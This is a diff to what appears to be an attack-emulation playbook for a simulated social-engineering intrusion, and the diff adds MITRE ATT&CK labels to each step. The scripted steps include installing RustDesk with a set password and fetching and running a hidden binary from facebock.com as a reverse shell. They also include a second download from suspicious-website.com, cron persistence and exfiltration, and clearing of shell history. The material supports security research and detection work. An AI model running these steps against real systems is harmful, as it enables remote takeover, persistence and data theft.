@@ -122,6 +122,11 @@ commands:
     cmd: type 
     input: "sudo wget -O rustdesk.deb -e use_proxy=yes -e https_proxy=https://192.168.50.254:3128 https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.deb"
     session: social_engineering
+    session: social_engineering
+    metadata:
+      techniques: "T1204.001,T1105,T1566.004" 
+      tactics: "Initial Access,Execution,Command and Control"
+      technique_name: "User Execution: Malicious Link,Ingress Tool Transfer,Phishing: Spearphishing Voice"
 
   - type: sleep
     seconds: 2
@@ -130,6 +135,11 @@ commands:
     cmd: key
     key: "enter"
     session: social_engineering
+    session: social_engineering
+    metadata:
+      techniques: "T1204.001,T1105,T1566.004" 
+      tactics: "Initial Access,Execution,Command and Control"
+      technique_name: "User Execution: Malicious Link,Ingress Tool Transfer,Phishing: Spearphishing Voice"
 
   - type: sleep
     seconds: 45
@@ -138,11 +148,22 @@ commands:
     cmd: type 
     input: "sudo apt install -fy ./rustdesk.deb"
     session: social_engineering
+    metadata:
+      techniques: "T1204.001,T1219" 
+      tactics: "Initial Access,Execution,Command and Control"
+      technique_name: "User Execution: Malicious Link,Remote Access Software"
+
+  - type: sleep
+    seconds: 1
 
   - type: vnc
     cmd: key
     key: "enter"
     session: social_engineering
+    metadata:
+      techniques: "T1204.001,T1219" 
+      tactics: "Initial Access,Execution,Command and Control"
+      technique_name: "User Execution: Malicious Link,Remote Access Software"
   
   - type: sleep
     seconds: 45
@@ -151,6 +172,10 @@ commands:
     cmd: type
     input: "sudo rustdesk --password password"
     session: social_engineering
+    metadata:
+      techniques: "T1566.004,T1219" 
+      tactics: "Execution"
+      technique_name: "Phishing: Spearphishing Voice,Remote Access Software"
 
   - type: sleep
     seconds: 2
@@ -159,6 +184,11 @@ commands:
     cmd: key
     key: "enter"
     session: social_engineering
+    metadata:
+      techniques: "T1566.004,T1219" 
+      tactics: "Execution"
+      technique_name: "Phishing: Spearphishing Voice,Remote Access Software"
+
 
   - type: sleep
     seconds: 10
@@ -168,6 +198,10 @@ commands:
     cmd: type
     input: "rustdesk"
     session: social_engineering
+    metadata:
+      techniques: "T1566.004,T1219" 
+      tactics: "Execution"
+      technique_name: "Phishing: Spearphishing Voice,Remote Access Software"
 
   - type: sleep
     seconds: 2
@@ -176,6 +210,10 @@ commands:
     cmd: key
     key: "enter"
     session: social_engineering
+    metadata:
+      techniques: "T1566.004,T1219" 
+      tactics: "Execution"
+      technique_name: "Phishing: Spearphishing Voice,Remote Access Software"
 
   - type: sleep
     seconds: 2
@@ -261,6 +299,10 @@ commands:
     cmd: type
     input: $ATTACKMATE_IP
     session: social_engineering
+    metadata:
+      techniques: "T1219" # Configuring Remote Access SW to connect to attacker C2
+      tactics: "Command and Control"
+      technique_name: "Remote Access Software"
 
   - type: sleep
     seconds: 1
@@ -560,6 +602,10 @@ commands:
     x: 802
     y: 489
     session: social_engineering
+    metadata:
+      techniques: "T1219" 
+      tactics: "Command and Control"
+      technique_name: "Remote Access Software"
 
   - type: sleep
     seconds: 3
@@ -567,6 +613,10 @@ commands:
   - type: vnc
     cmd: click
     session: social_engineering
+    metadata:
+      techniques: "T1219" 
+      tactics: "Command and Control"
+      technique_name: "Remote Access Software"
 
   - type: sleep
     seconds: 5
@@ -611,6 +661,10 @@ commands:
     cmd: type
     input: "curl -o /home/judy/.index facebock.com:8080/index"
     session: attacker
+    metadata:
+        techniques: "T1105,T1219,T1564.001" 
+        tactics: "Command and Control,Execution,Defense Evasion"
+        technique_name: "Ingress Tool Transfer,Remote Access Software,Hide Artifacts: Hidden Files and Directories"
     
   - type: sleep
     seconds: 1
@@ -619,6 +673,10 @@ commands:
     cmd: key
     key: "enter"
     session: attacker
+  metadata:
+      techniques: "T1105,T1219,T1564.001" 
+      tactics: "Command and Control,Execution,Defense Evasion"
+      technique_name: "Ingress Tool Transfer,Remote Access Software,Hide Artifacts: Hidden Files and Directories"
 
   - type: sleep
     seconds: 10
@@ -628,6 +686,10 @@ commands:
     cmd: type
     input: "sudo chmod +x /home/judy/.index"
     session: attacker
+    metadata:
+      techniques: "T1222.002,T1219" 
+      tactics: "Defense Evasion,Execution"
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,Remote Access Software"
     
   - type: sleep
     seconds: 1
@@ -636,15 +698,22 @@ commands:
     cmd: key
     key: "enter"
     session: attacker
+    metadata:
+      techniques: "T1222.002,T1219" 
+      tactics: "Defense Evasion,Execution"
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification,Remote Access Software"
 
   - type: sleep
     seconds: 1
 
-  # execute the reverse shell via the fake binary
   - type: vnc
     cmd: type
     input: "/home/judy/.index &"
     session: attacker
+    metadata:
+      techniques: "T1219,T1059.004" 
+      tactics: "Command and Control,Execution"
+      technique_name: "Remote Access Software,Command and Scripting Interpreter: Unix Shell"
 
   - type: sleep
     seconds: 2
@@ -657,7 +726,6 @@ commands:
   - type: sleep
     seconds: 5
 
-
 ##### Persistence OPTION B ######## set up a cronjob that executes the reverse shell
 
   # run commands via reverse shell
@@ -665,42 +733,79 @@ commands:
     stdapi: true
     session: revshell
     cmd: sysinfo
+    metadata:
+      techniques: "T1082"
+      tactics: "Discovery"
+      technique_name: "System Information Discovery"
 
   # upload cronjob that persists reverse shell
   - type: msf-session
     session: revshell
     cmd: upload crontab.txt
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
+
 
   # upload cronjob that extracts data
   - type: msf-session
     session: revshell
     cmd: upload downloader.txt
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
 
-  # get interactive shell
+ # get interactive shell
   - type: msf-session
     cmd: shell
     session: revshell
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
 
   - type: msf-session
     cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
     session: revshell
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
  
   - type: msf-session
     cmd: export SHELL=bash
     session: revshell
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
  
   - type: msf-session
     cmd: export TERM=xterm256-color
     session: revshell
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
 
   - type: msf-session
     cmd: stty rows 38 columns 116
     session: revshell
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
 
   # needed for xclip and wmctrl
   - type: msf-session
     cmd: export DISPLAY=:0
     session: revshell
+    metadata:
+      techniques: "T1059.004"
+      tactics: "Execution"
+      technique_name: "Command and Scripting Interpreter: Unix Shell"
 
 ################### ATTACKER GATHERS INFORMATION ############################
 
@@ -708,6 +813,10 @@ commands:
   - type: msf-session
     cmd: curl -o /home/judy/.local/bin/veiltransfer_client_linux suspicious-website.com:8082/index
     session: revshell
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
+      technique_name: "Ingress Tool Transfer"
 
   # get the last clipboard entry
   - type: msf-session
@@ -722,6 +831,11 @@ commands:
   - type: msf-session
     session: revshell
     cmd: chmod +x /home/judy/.local/bin/veiltransfer_client_linux 
+    metadata:
+      techniques: "T1222.002"
+      tactics: "Defense Evasion" 
+      technique_name: "File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification"
+
 
   # add the cronjob that persists reverse shell
   - type: msf-session
@@ -737,9 +851,9 @@ commands:
     session: revshell
     cmd: (crontab -l; cat /home/judy/downloader.txt) | crontab -
     metadata:
-      techniques: "T1029"
-      tactics: "Exfiltration"
-      technique_name: "Scheduled Transfer"
+      techniques: "T1029,T1053.003,T1048.001"
+      tactics: "Persistence, Execution,Exfiltration"
+      technique_name: "Scheduled Transfer,Scheduled Task/Job: Cron,Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol"
 
   # find out which windows are open
   - type: msf-session
@@ -755,9 +869,9 @@ commands:
     session: revshell
     cmd: history -c
     metadata:
-      techniques: "T1565.001"
-      tactics: "Defensive Evasion"
-      technique_name: "Data Manipulation: Stored Data Manipulation"
+      techniques: "T1070.003"
+      tactics: "Defense Evasion"
+      technique_name: "Indicator Removal: Clear Command History"
 
   # exit the interactive shell
   - type: msf-session
